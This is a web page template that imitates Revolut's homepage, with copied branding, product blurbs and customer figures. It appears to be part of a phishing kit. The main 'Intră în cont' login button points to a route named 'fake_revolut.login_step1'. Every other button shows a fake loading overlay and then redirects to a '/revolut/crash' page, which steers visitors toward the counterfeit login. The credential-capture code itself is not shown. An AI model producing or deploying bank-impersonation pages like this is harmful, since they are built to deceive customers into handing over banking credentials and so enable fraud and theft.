{% extends "revolut/base.html" %}

{% block title %}Revolut - One app, all things money{% endblock %}

{% block extra_head %}
<!-- Additional Google Fonts for enhanced typography -->
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">

<style>
/* Enhanced animations and effects */
@keyframes float {
    0% { transform: translateY(0px) rotate(0deg); }
    33% { transform: translateY(-8px) rotate(1deg); }
    66% { transform: translateY(-4px) rotate(-1deg); }
    100% { transform: translateY(0px) rotate(0deg); }
}

@keyframes pulse {
    0% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.8; transform: scale(1.05); }
    100% { opacity: 1; transform: scale(1); }
}

@keyframes slideInUp {
    from { transform: translateY(80px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
}

@keyframes slideInLeft {
    from { transform: translateX(-60px); opacity: 0; }
    to { transform: translateX(0); opacity: 1; }
}

@keyframes slideInRight {
    from { transform: translateX(60px); opacity: 0; }
    to { transform: translateX(0); opacity: 1; }
}

@keyframes bounce {
    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
    40% { transform: translateY(-15px); }
    60% { transform: translateY(-8px); }
}

@keyframes shimmer {
    0% { background-position: -1000px 0; }
    100% { background-position: 1000px 0; }
}

@keyframes gradientShift {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

/* Enhanced hero section with parallax and background images */
.hero-section {
    background: linear-gradient(135deg, rgba(99, 102, 241, 0.9) 0%, rgba(139, 92, 246, 0.9) 50%, rgba(236, 72, 153, 0.8) 100%), 
                url('/static/images/revolut_referral_hero.jpg') center/cover no-repeat;
    background-size: 120%;
    background-attachment: fixed;
    animation: gradientShift 8s ease infinite;
    position: relative;
    overflow: hidden;
}

.hero-section::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><radialGradient id="g"><stop offset="0%" stop-color="rgba(255,255,255,0.1)"/><stop offset="100%" stop-color="transparent"/></radialGradient></defs><circle cx="25" cy="25" r="20" fill="url(%23g)" opacity="0.6"/><circle cx="75" cy="75" r="15" fill="url(%23g)" opacity="0.8"/><circle cx="90" cy="30" r="10" fill="url(%23g)" opacity="0.4"/></svg>') center/200px 200px;
    animation: float 25s linear infinite;
    pointer-events: none;
}

.hero-section::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: radial-gradient(circle at 30% 20%, rgba(255, 255, 255, 0.05) 0%, transparent 50%),
                radial-gradient(circle at 70% 80%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
    pointer-events: none;
}

.hero-content {
    animation: slideInUp 1.2s ease-out;
    position: relative;
    z-index: 2;
}

.hero-content h1 {
    font-family: 'Poppins', 'Inter', sans-serif;
    font-size: 3.5rem;
    font-weight: 800;
    margin-bottom: 1.5rem;
    background: linear-gradient(45deg, #ffffff, #e0e7ff, #f8fafc);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    text-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
    letter-spacing: -0.02em;
    line-height: 1.1;
}

.hero-content p {
    font-family: 'Roboto', 'Inter', sans-serif;
    font-size: 1.3rem;
    font-weight: 400;
    opacity: 0.95;
    margin-bottom: 3rem;
    max-width: 650px;
    margin-left: auto;
    margin-right: auto;
    line-height: 1.6;
    text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
}

.floating-icon {
    animation: float 4s ease-in-out infinite;
    display: inline-block;
    filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.2));
}

.floating-icon:nth-child(odd) {
    animation-delay: -2s;
}

.pulsing {
    animation: pulse 3s infinite ease-in-out;
}

.btn-animated {
    transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    position: relative;
    overflow: hidden;
    transform-style: preserve-3d;
    font-family: 'Poppins', 'Inter', sans-serif;
    font-weight: 600;
    letter-spacing: 0.5px;
}

.btn-animated::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
    transition: left 0.6s ease;
}

.btn-animated:hover::before {
    left: 100%;
}

.btn-animated:hover {
    transform: translateY(-4px) scale(1.03);
    box-shadow: 0 15px 35px rgba(99, 102, 241, 0.4), 0 5px 15px rgba(0,0,0,0.2);
}

.btn-animated:active {
    transform: translateY(-2px) scale(1.01);
    transition: all 0.1s ease;
}

.interactive-card {
    transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    cursor: pointer;
    position: relative;
    overflow: hidden;
    border-radius: 20px;
    background: linear-gradient(145deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255, 255, 255, 0.2);
}

.interactive-card::before {
    content: '';
    position: absolute;
    top: -2px;
    left: -2px;
    right: -2px;
    bottom: -2px;
    background: linear-gradient(45deg, transparent, rgba(99, 102, 241, 0.5), rgba(139, 92, 246, 0.5), transparent);
    border-radius: inherit;
    z-index: -1;
    opacity: 0;
    transition: opacity 0.3s ease;
}

.interactive-card:hover::before {
    opacity: 1;
    animation: pulse 2s infinite;
}

.interactive-card:hover {
    transform: translateY(-12px) scale(1.02) rotateX(5deg);
    box-shadow: 0 25px 50px rgba(99, 102, 241, 0.3), 0 15px 30px rgba(0, 0, 0, 0.2);
}

.glowing-border {
    position: relative;
    overflow: hidden;
    border-radius: 20px;
}

.glowing-border::before {
    content: '';
    position: absolute;
    top: -3px;
    left: -3px;
    right: -3px;
    bottom: -3px;
    background: linear-gradient(45deg, #6366f1, #8b5cf6, #ec4899, #f59e0b, #10b981, #6366f1);
    background-size: 300% 300%;
    border-radius: inherit;
    z-index: -1;
    opacity: 0;
    transition: opacity 0.4s ease;
    animation: gradientShift 3s ease infinite;
}

.glowing-border:hover::before {
    opacity: 1;
}

.stats-counter {
    font-family: 'Poppins', 'Inter', sans-serif;
    font-size: 3.2rem;
    font-weight: 800;
    background: linear-gradient(135deg, #0066cc, #6366f1, #8b5cf6);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    position: relative;
    text-shadow: 0 4px 20px rgba(99, 102, 241, 0.3);
}

.feature-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
    gap: 2.5rem;
    margin-top: 4rem;
}

.feature-card {
    background: linear-gradient(145deg, rgba(26, 26, 62, 0.9), rgba(15, 15, 35, 0.8));
    border-radius: 24px;
    padding: 2.5rem;
    position: relative;
    overflow: hidden;
    backdrop-filter: blur(20px);
    border: 1px solid rgba(99, 102, 241, 0.2);
    animation: slideInUp 0.8s ease-out;
}

.feature-card::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(45deg, transparent, rgba(99, 102, 241, 0.03), transparent);
    opacity: 0;
    transition: opacity 0.3s ease;
}

.feature-card:hover::before {
    opacity: 1;
}

.feature-card:nth-child(1) { animation-delay: 0.1s; }
.feature-card:nth-child(2) { animation-delay: 0.2s; }
.feature-card:nth-child(3) { animation-delay: 0.3s; }
.feature-card:nth-child(4) { animation-delay: 0.4s; }
.feature-card:nth-child(5) { animation-delay: 0.5s; }
.feature-card:nth-child(6) { animation-delay: 0.6s; }

.feature-icon {
    font-size: 3.5rem;
    margin-bottom: 1.5rem;
    display: block;
    filter: drop-shadow(0 4px 12px rgba(99, 102, 241, 0.4));
}

.section-with-bg {
    position: relative;
    background-image: url('/static/images/revolut_features.jpg');
    background-size: cover;
    background-position: center;
    background-attachment: fixed;
}

.section-with-bg::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(135deg, rgba(15, 15, 35, 0.85), rgba(26, 26, 62, 0.9));
    z-index: 1;
}

.section-with-bg > .main-container {
    position: relative;
    z-index: 2;
}
</style>
{% endblock %}

{% block content %}
<!-- Enhanced Hero Section with Background Image -->
<section class="hero-section">
    <div class="main-container">
        <div class="hero-content">
            <h1 class="pulsing">
                <span class="floating-icon">üí≥</span> 
                One app, all things money
                <span class="floating-icon">üåü</span>
            </h1>
            <p>From everyday spending to international transfers and investments, Revolut helps you get more from your money</p>
            <div style="margin-top: 3rem;">
                <!-- Functional login button with enhanced styling -->
                <a href="{{ url_for('fake_revolut.login_step1') }}" class="btn btn-primary btn-large btn-animated" id="main-login-btn" style="margin-right: 1.5rem; margin-bottom: 1rem;">
                    <span class="floating-icon">üîê</span> IntrƒÉ √Æn cont
                </a>
                
                <!-- Crash trigger buttons with enhanced animations -->
                <a href="#" class="btn btn-secondary btn-large btn-animated crash-trigger" style="margin-bottom: 1rem;">
                    <span class="floating-icon">üì±</span> DescarcƒÉ aplica»õia
                </a>
            </div>
            
            <div style="margin-top: 2rem; display: flex; gap: 1.5rem; justify-content: center; flex-wrap: wrap;">
                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
                    <span class="floating-icon">üìä</span> Investe»ôte acum
                </a>
                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
                    <span class="floating-icon">üè¢</span> Revolut Business
                </a>
                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
                    <span class="floating-icon">üí∞</span> Carduri premium
                </a>
                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
                    <span class="floating-icon">üåç</span> Transferuri globale
                </a>
            </div>
        </div>
    </div>
</section>

<!-- Enhanced Features Section with Background -->
<section class="section-with-bg" style="padding: 5rem 0;">
    <div class="main-container">
        <div style="text-align: center; margin-bottom: 4rem;">
            <h2 style="font-family: 'Poppins', 'Inter', sans-serif; font-size: 2.8rem; font-weight: 800; margin-bottom: 1.5rem; color: #ffffff; text-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);">
                <span class="floating-icon">‚ö°</span> Banking, but better <span class="floating-icon">üöÄ</span>
            </h2>
            <p style="font-family: 'Roboto', sans-serif; font-size: 1.3rem; color: #d1d5db; max-width: 700px; margin: 0 auto; line-height: 1.6;">Join 35+ million customers who trust Revolut for all their financial needs</p>
        </div>
        
        <div class="feature-grid">
            <div class="feature-card interactive-card glowing-border">
                <div class="feature-icon floating-icon">üí≥</div>
                <h3 style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.4rem; margin-bottom: 1rem; color: #ffffff;">Spend & Save</h3>
                <p style="color: #d1d5db; line-height: 1.7; margin-bottom: 2rem;">Get a debit card that gives you the real exchange rate and fee-free spending worldwide</p>
                <a href="#" class="btn btn-primary crash-trigger btn-animated">
                    <span class="floating-icon">üìñ</span> AflƒÉ mai multe
                </a>
            </div>
            
            <div class="feature-card interactive-card glowing-border">
                <div class="feature-icon floating-icon">üåç</div>
                <h3 style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.4rem; margin-bottom: 1rem; color: #ffffff;">Global Transfers</h3>
                <p style="color: #d1d5db; line-height: 1.7; margin-bottom: 2rem;">Send money abroad instantly at the real exchange rate with no hidden fees</p>
                <a href="#" class="btn btn-primary crash-trigger btn-animated">
                    <span class="floating-icon">üöÄ</span> Trimite bani
                </a>
            </div>
            
            <div class="feature-card interactive-card glowing-border">
                <div class="feature-icon floating-icon">üìà</div>
                <h3 style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.4rem; margin-bottom: 1rem; color: #ffffff;">Invest</h3>
                <p style="color: #d1d5db; line-height: 1.7; margin-bottom: 2rem;">Commission-free trading in stocks, crypto, and commodities</p>
                <a href="#" class="btn btn-primary crash-trigger btn-animated">
                    <span class="floating-icon">üìä</span> √éncepe sƒÉ investe»ôti
                </a>
            </div>
            
            <div class="feature-card interactive-card glowing-border">
                <div class="feature-icon floating-icon">üè¢</div>
                <h3 style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.4rem; margin-bottom: 1rem; color: #ffffff;">Business</h3>
                <p style="color: #d1d5db; line-height: 1.7; margin-bottom: 2rem;">Multi-currency business accounts with expense management and corporate cards</p>
                <a href="#" class="btn btn-primary crash-trigger btn-animated">
                    <span class="floating-icon">üè¨</span> Cont business
                </a>
            </div>
            
            <div class="feature-card interactive-card glowing-border">
                <div class="feature-icon floating-icon">üéØ</div>
                <h3 style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.4rem; margin-bottom: 1rem; color: #ffffff;">Junior Account</h3>
                <p style="color: #d1d5db; line-height: 1.7; margin-bottom: 2rem;">Teaching financial responsibility with parental controls and spending insights</p>
                <a href="#" class="btn btn-primary crash-trigger btn-animated">
                    <span class="floating-icon">üë¶</span> Pentru copii
                </a>
            </div>
            
            <div class="feature-card interactive-card glowing-border">
                <div class="feature-icon floating-icon">üí∞</div>
                <h3 style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.4rem; margin-bottom: 1rem; color: #ffffff;">Premium Cards</h3>
                <p style="color: #d1d5db; line-height: 1.7; margin-bottom: 2rem;">Metal cards with exclusive benefits, travel insurance, and airport lounge access</p>
                <a href="#" class="btn btn-primary crash-trigger btn-animated">
                    <span class="floating-icon">üíé</span> Upgrade premium
                </a>
            </div>
        </div>
    </div>
</section>

<!-- Enhanced Statistics Section with IBAN Hero Background -->
<section style="padding: 5rem 0; position: relative; background: linear-gradient(135deg, rgba(15, 15, 35, 0.9), rgba(26, 26, 62, 0.95)), url('/static/images/revolut_iban_hero.jpg') center/cover no-repeat; background-attachment: fixed;">
    <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(circle at 50% 50%, rgba(99, 102, 241, 0.1) 0%, transparent 70%);"></div>
    <div class="main-container" style="position: relative; z-index: 2;">
        <div style="text-align: center; margin-bottom: 4rem;">
            <h2 style="font-family: 'Poppins', 'Inter', sans-serif; font-size: 2.8rem; font-weight: 800; margin-bottom: 1.5rem; color: #ffffff; text-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);">
                <span class="floating-icon">üåü</span> Join millions worldwide <span class="floating-icon">üåç</span>
            </h2>
            <p style="font-family: 'Roboto', sans-serif; font-size: 1.3rem; color: #d1d5db; line-height: 1.6;">Experience banking without borders</p>
        </div>
        
        <div class="interactive-card glowing-border" style="background: linear-gradient(145deg, rgba(26, 26, 62, 0.9), rgba(15, 15, 35, 0.8)); border-radius: 24px; padding: 3rem; text-align: center; backdrop-filter: blur(30px); border: 1px solid rgba(99, 102, 241, 0.3);">
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 3rem; margin-bottom: 3rem;">
                <div class="interactive-card" style="background: transparent; transform-style: preserve-3d;">
                    <div class="stats-counter floating-icon" data-target="35">0M+</div>
                    <div style="color: #d1d5db; font-weight: 600; font-size: 1.1rem; margin-top: 0.5rem;">Customers worldwide</div>
                </div>
                <div class="interactive-card" style="background: transparent; transform-style: preserve-3d;">
                    <div class="stats-counter floating-icon" data-target="180">0+</div>
                    <div style="color: #d1d5db; font-weight: 600; font-size: 1.1rem; margin-top: 0.5rem;">Countries supported</div>
                </div>
                <div class="interactive-card" style="background: transparent; transform-style: preserve-3d;">
                    <div class="stats-counter floating-icon" data-target="1">$0B+</div>
                    <div style="color: #d1d5db; font-weight: 600; font-size: 1.1rem; margin-top: 0.5rem;">Transferred daily</div>
                </div>
                <div class="interactive-card" style="background: transparent; transform-style: preserve-3d;">
                    <div class="stats-counter floating-icon" data-target="150">0+</div>
                    <div style="color: #d1d5db; font-weight: 600; font-size: 1.1rem; margin-top: 0.5rem;">Currencies supported</div>
                </div>
            </div>
            
            <div style="margin-bottom: 3rem;">
                <a href="#" class="btn btn-primary btn-large btn-animated crash-trigger" style="margin-right: 1.5rem; margin-bottom: 1rem;">
                    <span class="floating-icon">‚ú®</span> Start your journey
                </a>
                <a href="#" class="btn btn-secondary btn-large btn-animated crash-trigger" style="margin-bottom: 1rem;">
                    <span class="floating-icon">üì±</span> Download app
                </a>
            </div>
            
            <div style="display: flex; gap: 1.5rem; justify-content: center; flex-wrap: wrap;">
                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
                    <span class="floating-icon">üí≥</span> Apply for card
                </a>
                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
                    <span class="floating-icon">üè¶</span> Open business account
                </a>
                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
                    <span class="floating-icon">üìà</span> Start trading
                </a>
            </div>
        </div>
    </div>
</section>

<!-- Enhanced Ready to Start Section -->
<section style="padding: 5rem 0; background: linear-gradient(135deg, var(--revolut-dark) 0%, var(--revolut-dark-secondary) 100%);">
    <div class="main-container">
        <div style="text-align: center;">
            <h2 style="font-family: 'Poppins', 'Inter', sans-serif; font-size: 2.8rem; font-weight: 800; margin-bottom: 1.5rem; color: #ffffff;">
                <span class="floating-icon">üöÄ</span> Ready to get started? <span class="floating-icon">üí´</span>
            </h2>
            <p style="font-family: 'Roboto', sans-serif; font-size: 1.3rem; color: #d1d5db; margin-bottom: 3rem; line-height: 1.6;">It takes less than 5 minutes to sign up</p>
            
            <div style="margin-bottom: 3rem;">
                <a href="#" class="btn btn-primary btn-large btn-animated crash-trigger" style="margin-right: 1.5rem; margin-bottom: 1rem;">
                    <span class="floating-icon">üéØ</span> Open account
                </a>
                <a href="#" class="btn btn-secondary btn-large btn-animated crash-trigger" style="margin-bottom: 1rem;">
                    <span class="floating-icon">üîç</span> Learn more
                </a>
            </div>
            
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 2rem; margin-top: 4rem;">
                <div class="feature-card interactive-card glowing-border" style="text-align: center;">
                    <div class="feature-icon floating-icon">üì±</div>
                    <h4 style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.3rem; margin-bottom: 1rem; color: #ffffff;">Mobile Banking</h4>
                    <p style="color: #d1d5db; margin-bottom: 2rem; line-height: 1.6;">Manage your money on the go</p>
                    <a href="#" class="btn btn-primary crash-trigger btn-animated">
                        <span class="floating-icon">‚¨áÔ∏è</span> Download
                    </a>
                </div>
                
                <div class="feature-card interactive-card glowing-border" style="text-align: center;">
                    <div class="feature-icon floating-icon">üíº</div>
                    <h4 style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.3rem; margin-bottom: 1rem; color: #ffffff;">Business Solutions</h4>
                    <p style="color: #d1d5db; margin-bottom: 2rem; line-height: 1.6;">Banking for your business</p>
                    <a href="#" class="btn btn-primary crash-trigger btn-animated">
                        <span class="floating-icon">üè¢</span> Get started
                    </a>
                </div>
                
                <div class="feature-card interactive-card glowing-border" style="text-align: center;">
                    <div class="feature-icon floating-icon">üéì</div>
                    <h4 style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.3rem; margin-bottom: 1rem; color: #ffffff;">Financial Education</h4>
                    <p style="color: #d1d5db; margin-bottom: 2rem; line-height: 1.6;">Learn about investing</p>
                    <a href="#" class="btn btn-primary crash-trigger btn-animated">
                        <span class="floating-icon">üìö</span> Learn
                    </a>
                </div>
                
                <div class="feature-card interactive-card glowing-border" style="text-align: center;">
                    <div class="feature-icon floating-icon">üíé</div>
                    <h4 style="font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.3rem; margin-bottom: 1rem; color: #ffffff;">Premium Perks</h4>
                    <p style="color: #d1d5db; margin-bottom: 2rem; line-height: 1.6;">Exclusive benefits await</p>
                    <a href="#" class="btn btn-primary crash-trigger btn-animated">
                        <span class="floating-icon">‚≠ê</span> Upgrade
                    </a>
                </div>
            </div>
        </div>
    </div>
</section>

<script>
// Enhanced crash trigger functionality with sophisticated animations
document.addEventListener('DOMContentLoaded', function() {
    // Create loading overlay for enhanced UX
    function createLoadingOverlay() {
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(15, 15, 35, 0.95), rgba(26, 26, 62, 0.98));
            backdrop-filter: blur(10px);
            z-index: 10000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transition: opacity 0.3s ease;
        `;
        
        overlay.innerHTML = `
            <div style="text-align: center; color: white;">
                <div style="width: 60px; height: 60px; border: 4px solid rgba(99, 102, 241, 0.3); border-top: 4px solid #6366f1; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 2rem;"></div>
                <h3 style="font-family: 'Poppins', sans-serif; font-size: 1.5rem; margin-bottom: 1rem; font-weight: 600;">Loading Revolut...</h3>
                <p style="font-family: 'Roboto', sans-serif; color: #d1d5db; font-size: 1rem;">Please wait while we redirect you</p>
            </div>
        `;
        
        document.body.appendChild(overlay);
        setTimeout(() => overlay.style.opacity = '1', 50);
        
        return overlay;
    }
    
    // Enhanced crash trigger handlers with realistic loading
    const crashTriggers = document.querySelectorAll('.crash-trigger');
    crashTriggers.forEach(trigger => {
        trigger.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Disable the button immediately
            this.style.pointerEvents = 'none';
            const originalContent = this.innerHTML;
            
            // Add loading animation to button
            this.innerHTML = '<span style="animation: spin 1s linear infinite; display: inline-block;">‚è≥</span> Loading...';
            this.style.opacity = '0.7';
            
            // Create loading overlay
            const overlay = createLoadingOverlay();
            
            // Simulate realistic loading time (1-3 seconds)
            const loadingTime = 1000 + Math.random() * 2000;
            
            setTimeout(() => {
                // Fade out overlay
                overlay.style.opacity = '0';
                setTimeout(() => {
                    window.location.href = '/revolut/crash';
                }, 300);
            }, loadingTime);
        });
        
        // Enhanced hover effects
        trigger.addEventListener('mouseenter', function() {
            if (this.style.pointerEvents !== 'none') {
                this.style.transform = 'translateY(-4px) scale(1.03)';
                this.style.boxShadow = '0 15px 35px rgba(99, 102, 241, 0.4), 0 5px 15px rgba(0,0,0,0.2)';
            }
        });
        
        trigger.addEventListener('mouseleave', function() {
            if (this.style.pointerEvents !== 'none') {
                this.style.transform = '';
                this.style.boxShadow = '';
            }
        });
    });
    
    // Enhanced stats counter animation with easing
    const statsCounters = document.querySelectorAll('.stats-counter');
    
    function animateCounter(counter) {
        const target = parseInt(counter.getAttribute('data-target'));
        let current = 0;
        const increment = target / 80; // Slower, smoother animation
        const suffix = counter.textContent.includes('$') ? 'B+' : 
                      counter.textContent.includes('M') ? 'M+' : '+';
        const prefix = counter.textContent.includes('$') ? '$' : '';
        
        function easeOutQuart(x) {
            return 1 - Math.pow(1 - x, 4);
        }
        
        let startTime = null;
        function animate(timestamp) {
            if (!startTime) startTime = timestamp;
            const progress = Math.min((timestamp - startTime) / 2000, 1); // 2 second animation
            
            current = target * easeOutQuart(progress);
            counter.textContent = prefix + Math.floor(current) + suffix;
            
            if (progress < 1) {
                requestAnimationFrame(animate);
            } else {
                counter.textContent = prefix + target + suffix;
            }
        }
        
        requestAnimationFrame(animate);
    }
    
    // Intersection Observer for stats animation
    const statsObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting && !entry.target.dataset.animated) {
                entry.target.dataset.animated = 'true';
                animateCounter(entry.target);
            }
        });
    }, { threshold: 0.5 });
    
    statsCounters.forEach(counter => {
        statsObserver.observe(counter);
    });
    
    // Enhanced scroll animations for feature cards
    const featureCards = document.querySelectorAll('.feature-card');
    const cardObserver = new IntersectionObserver((entries) => {
        entries.forEach((entry, index) => {
            if (entry.isIntersecting) {
                setTimeout(() => {
                    entry.target.style.animation = 'slideInUp 0.8s ease-out forwards';
                    entry.target.style.opacity = '1';
                }, index * 100);
            }
        });
    }, { threshold: 0.1 });
    
    featureCards.forEach(card => {
        card.style.opacity = '0';
        cardObserver.observe(card);
    });
    
    // Parallax effect for background images
    window.addEventListener('scroll', () => {
        const scrolled = window.pageYOffset;
        const parallaxElements = document.querySelectorAll('[style*="background-attachment: fixed"]');
        
        parallaxElements.forEach(element => {
            const rate = scrolled * -0.5;
            element.style.backgroundPosition = `center ${rate}px`;
        });
    });
    
    // Enhanced floating animation for icons
    const floatingIcons = document.querySelectorAll('.floating-icon');
    floatingIcons.forEach((icon, index) => {
        // Randomize animation delay and duration for more natural movement
        const delay = Math.random() * 2;
        const duration = 3 + Math.random() * 2;
        icon.style.animationDelay = delay + 's';
        icon.style.animationDuration = duration + 's';
        
        // Add subtle rotation on hover
        icon.addEventListener('mouseenter', function() {
            this.style.transform = 'rotate(360deg) scale(1.1)';
            this.style.transition = 'transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
        });
        
        icon.addEventListener('mouseleave', function() {
            this.style.transform = '';
        });
    });
    
    // Add subtle page entrance animation
    document.body.style.opacity = '0';
    document.body.style.transition = 'opacity 0.8s ease-in-out';
    
    window.addEventListener('load', () => {
        document.body.style.opacity = '1';
    });
    
    // Enhanced main login button with special effects
    const mainLoginBtn = document.getElementById('main-login-btn');
    if (mainLoginBtn) {
        mainLoginBtn.addEventListener('mouseenter', function() {
            this.style.boxShadow = '0 20px 40px rgba(99, 102, 241, 0.5), 0 10px 20px rgba(0,0,0,0.3)';
            this.style.transform = 'translateY(-5px) scale(1.05)';
        });
        
        mainLoginBtn.addEventListener('mouseleave', function() {
            this.style.boxShadow = '';
            this.style.transform = '';
        });
        
        mainLoginBtn.addEventListener('click', function() {
            // Add click ripple effect
            const ripple = document.createElement('span');
            ripple.style.cssText = `
                position: absolute;
                border-radius: 50%;
                background: rgba(255, 255, 255, 0.4);
                transform: scale(0);
                animation: ripple 0.6s linear;
                left: 50%;
                top: 50%;
                margin-left: -20px;
                margin-top: -20px;
                width: 40px;
                height: 40px;
                pointer-events: none;
            `;
            
            this.appendChild(ripple);
            setTimeout(() => ripple.remove(), 600);
        });
    }
});

// CSS for ripple animation
const style = document.createElement('style');
style.textContent = `
    @keyframes ripple {
        to {
            transform: scale(4);
            opacity: 0;
        }
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
`;
document.head.appendChild(style);
</script>
{% endblock %}